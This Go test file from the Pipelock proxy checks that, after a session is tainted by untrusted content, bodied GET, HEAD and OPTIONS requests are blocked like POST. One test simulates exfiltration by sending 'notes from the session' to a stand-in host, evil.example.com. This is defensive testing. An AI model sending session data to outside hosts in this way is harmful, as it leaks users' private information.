// Copyright 2026 Pipelock contributors
// SPDX-License-Identifier: Apache-2.0

package proxy

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
	"github.com/luckyPipewrench/pipelock/internal/envelope"
	"github.com/luckyPipewrench/pipelock/internal/session"
)

func TestRequestHasBody(t *testing.T) {
	chunked := httptest.NewRequestWithContext(t.Context(), http.MethodGet, "http://x.example/", strings.NewReader("a"))
	chunked.ContentLength = -1
	chunked.TransferEncoding = []string{"chunked"}
	unknown := httptest.NewRequestWithContext(t.Context(), http.MethodGet, "http://x.example/", strings.NewReader("a"))
	unknown.ContentLength = -1
	unknownEmpty := httptest.NewRequestWithContext(t.Context(), http.MethodGet, "http://x.example/", http.NoBody)
	unknownEmpty.ContentLength = -1
	for _, tc := range []struct {
		name string
		r    *http.Request
		want bool
	}{
		{"nil", nil, false},
		{"no_body", httptest.NewRequestWithContext(t.Context(), http.MethodGet, "http://x.example/", http.NoBody), false},
		{"zero_length", httptest.NewRequestWithContext(t.Context(), http.MethodGet, "http://x.example/", strings.NewReader("")), false},
		{"sized_body", httptest.NewRequestWithContext(t.Context(), http.MethodGet, "http://x.example/", strings.NewReader("payload")), true},
		{"chunked", chunked, true},
		{"unknown_length_body", unknown, true},
		{"unknown_length_no_body", unknownEmpty, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := requestHasBody(tc.r); got != tc.want {
				t.Fatalf("requestHasBody=%v want %v", got, tc.want)
			}
		})
	}
}

// After untrusted exposure, a read-shaped method that carries a body must get
// the same decision as POST on intercepted HTTPS, and must not reach upstream
// without approval. Bodyless reads keep proceeding.
func TestInterceptTaintBodiedReadMethodsMatchPublish(t *testing.T) {
	for _, method := range []string{http.MethodGet, http.MethodHead, http.MethodOptions, "get"} {
		for _, body := range []bool{false, true} {
			name := method + map[bool]string{false: "_bodyless", true: "_bodied"}[body]
			t.Run(name, func(t *testing.T) {
				p, _, rec, target, ic := newTaintInterceptFixture(t, nil)
				observeHTTPResponseTaint(rec, p.CurrentConfig(), target, "text/plain", "forward_response", false)
				var upstreamCalls int
				handler := newInterceptHandler(ic, roundTripperFunc(func(r *http.Request) (*http.Response, error) {
					upstreamCalls++
					return &http.Response{StatusCode: http.StatusOK, Header: http.Header{"Content-Type": {"text/plain"}}, Body: io.NopCloser(strings.NewReader("ok")), Request: r}, nil
				}))
				var reqBody io.Reader = http.NoBody
				if body {
					reqBody = strings.NewReader("notes from the session")
				}
				req := httptest.NewRequestWithContext(t.Context(), method, target, reqBody)
				w := httptest.NewRecorder()
				handler.ServeHTTP(w, req)
				if !body {
					if w.Code != http.StatusOK || upstreamCalls != 1 {
						t.Fatalf("bodyless %s status=%d calls=%d body=%s", method, w.Code, upstreamCalls, w.Body)
					}
					return
				}
				post := evaluateHTTPTaint(p.CurrentConfig(), rec, http.MethodPost, req.URL, true)
				if post.Result.Decision != session.PolicyAsk {
					t.Fatalf("POST decision=%+v, want ask", post.Result)
				}
				if w.Code != http.StatusForbidden || upstreamCalls != 0 || !strings.Contains(w.Body.String(), post.Result.Reason) {
					t.Fatalf("bodied %s status=%d calls=%d body=%s, want forbidden %s", method, w.Code, upstreamCalls, w.Body, post.Result.Reason)
				}
			})
		}
	}
}

func TestForwardTaintBodiedGETAsksLikePost(t *testing.T) {
	var hits atomic.Int32
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		_, _ = w.Write([]byte("ok"))
	}))
	defer upstream.Close()
	proxyAddr, p, cleanup := setupForwardProxyWithInstance(t, func(cfg *config.Config) {
		cfg.ResponseScanning.Enabled = false
		cfg.SessionProfiling.Enabled = true
	})
	defer cleanup()
	installForwardTestDialer(p, upstream.Listener.Addr().String())
	rec := p.sessionMgrPtr.Load().GetOrCreate(ceeSessionKey(nil, "", "127.0.0.1", envelope.ActorAuthSelfDeclared))
	observeHTTPResponseTaint(rec, p.cfgPtr.Load(), "http://evil.example.com/source", "text/plain", "forward_response", false)
	client := forwardHTTPClient(t, proxyAddr)

	do := func(body io.Reader) int {
		req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, "http://evil.example.com/search", body)
		if err != nil {
			t.Fatal(err)
		}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = resp.Body.Close() }()
		_, _ = io.Copy(io.Discard, resp.Body)
		return resp.StatusCode
	}
	if status := do(http.NoBody); status != http.StatusOK || hits.Load() != 1 {
		t.Fatalf("bodyless GET status=%d hits=%d", status, hits.Load())
	}
	if status := do(strings.NewReader("notes from the session")); status != http.StatusForbidden || hits.Load() != 1 {
		t.Fatalf("bodied GET status=%d hits=%d, want forbidden without upstream", status, hits.Load())
	}
}
